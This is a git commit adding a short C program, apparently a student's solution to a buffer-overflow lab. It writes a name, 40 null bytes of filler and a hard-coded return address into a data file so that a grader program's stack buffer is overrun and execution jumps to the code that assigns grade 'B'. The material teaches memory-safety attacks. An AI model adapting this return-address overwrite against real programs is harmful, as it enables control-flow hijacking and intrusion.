06e63b7238c982ef9ccea5186bd69f5081a0bbc9
Jiatong Yu <jiatongy@armlab01.cs.princeton.edu>
2021-05-05 13:44:01 -0400

    b attack

---
+++ createdataB.c
@@ -0,0 +1,35 @@
+/*--------------------------------------------------------------------*/
+/* createdataB.c                                                      */
+/* Author: Jiatong Yu                                                 */
+/*--------------------------------------------------------------------*/
+
+#include <stdio.h>
+
+/* main function writes to the file dataB name and filler, and corresponding
+address to overrun the grader file */
+int main(void) {
+    int i;
+    unsigned long ulAddress;
+    FILE* psFile;
+    psFile = fopen("dataB","w");
+
+    /* write my name into file */
+    fprintf(psFile, "Jiatongy");
+    /* write 40 null bytes into file to the end of buf */
+    /* 40 is a magic number that represent the remaining chars inside buf to be filled*/
+    for(i = 0; i < 40; i++) {
+        putc('\0', psFile);
+    }
+
+    /* put the address of grade = 'B' into stack */
+    /* 0x400858 */
+    ulAddress = 0x400858;
+    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);
+
+    fclose(psFile);
+
+    return 1;
+
+}
+
+
